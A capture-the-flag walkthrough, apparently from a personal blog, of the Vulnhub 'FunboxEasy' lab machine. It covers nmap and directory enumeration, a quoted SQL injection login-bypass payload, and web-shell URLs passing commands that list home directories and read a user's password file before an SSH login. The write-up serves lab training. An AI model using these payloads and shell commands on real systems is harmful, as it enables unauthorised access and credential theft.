---
layout: default
title : muzec - FunboxEasy Writeup
---

![f1](https://user-images.githubusercontent.com/69868171/99809925-55748680-2ad6-11eb-957f-57f5ade09327.PNG)


Boot2Root ! Easy going, but with this Funbox you have to spend a bit more time. Much more, if you stuck in good traps. But most of the traps have hints, that they are traps.
Vulnhub link to download FunboxEasy:- [FunboxEasy](https://www.vulnhub.com/entry/funbox-3,526/)

We always start with an nmap scan.....


```Nmap -sC -sV -oA nmap <Target-IP>```

```
Nmap scan report for 192.168.250.111
Host is up (0.27s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_gym
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov 17 04:15:11 2020 -- 1 IP address (1 host up) scanned in 67.65 seconds
```

Ok let hit the robots.txt on port 80.

![f2](https://user-images.githubusercontent.com/69868171/99810866-acc72680-2ad7-11eb-979b-4937b8070eff.PNG)

Gym let try to access it with the IP/gym

![f3](https://user-images.githubusercontent.com/69868171/99811300-4ee70e80-2ad8-11eb-9787-eba0b03d4c55.PNG)

I spend a little time trying to get the right credentials but no luck so i decided to burst some directorys with dirbuster i think the robots.txt is the first rabbit hole lol.

![f4](https://user-images.githubusercontent.com/69868171/99813851-886d4900-2adb-11eb-919b-9052f4ea4ba8.PNG)

Another dir let check it out.

![f5](https://user-images.githubusercontent.com/69868171/99813965-aaff6200-2adb-11eb-977c-0dc2cfc69e38.PNG)

Small CRM Projects admin login page let try to check for some default credentials or maybe a vulnerable to get in.

![f6](https://user-images.githubusercontent.com/69868171/99814322-27924080-2adc-11eb-8aa4-2db2cebc2e91.PNG)

Description:
There is a SQL injection vulnerability in the /index.php page
which allows for an attacker to use the SQLi login bypass payload
'=''or' for both the username and password parameters, this allows
for any authenticated or low level user to login to the admin account.

![f7](https://user-images.githubusercontent.com/69868171/99814724-b1420e00-2adc-11eb-95b4-cbf388c66096.PNG)

Boom we are in but it just another rabbit hole 2 lol let enumerate more let go back to our dirbuster to check more dir.

![f8](https://user-images.githubusercontent.com/69868171/99814940-02520200-2add-11eb-8572-88d1cd2949f4.PNG)

The store dir look interesting let hit it.

![f9](https://user-images.githubusercontent.com/69868171/99815180-4ba25180-2add-11eb-836b-18967b4636c2.PNG)

Online book store by projectworlds pretty old also 2017 cool.

![f10](https://user-images.githubusercontent.com/69868171/99815965-60cbb000-2ade-11eb-9456-8a782ae8451e.PNG)

Let download and try the exploit.

![f11](https://user-images.githubusercontent.com/69868171/99816436-01ba6b00-2adf-11eb-8fc1-5f25d5a98821.PNG)

Boom finally we are in.

![f12](https://user-images.githubusercontent.com/69868171/99816828-77bed200-2adf-11eb-9f3c-a0ca49510e27.PNG)

```http://192.168.250.111/store/bootstrap/img/B8Wsi38YLp.php?cmd=ls -la /home```

![f13](https://user-images.githubusercontent.com/69868171/99817286-0f242500-2ae0-11eb-8219-7102924adefb.PNG)

```http://192.168.250.111/store/bootstrap/img/B8Wsi38YLp.php?cmd=ls -la /home/tony```

![f14](https://user-images.githubusercontent.com/69868171/99818458-9625cd00-2ae1-11eb-9526-836999c291d5.PNG)

```http://192.168.250.111/store/bootstrap/img/B8Wsi38YLp.php?cmd=less /home/tony/password.txt```

![f15](https://user-images.githubusercontent.com/69868171/99818871-10eee800-2ae2-11eb-82c8-4854720583cd.PNG)

Boom we have the ssh password also the username which is tony let hit ssh.

![f16](https://user-images.githubusercontent.com/69868171/99819349-ae4a1c00-2ae2-11eb-975f-e9b4c616bda9.PNG)

ssh we are in.



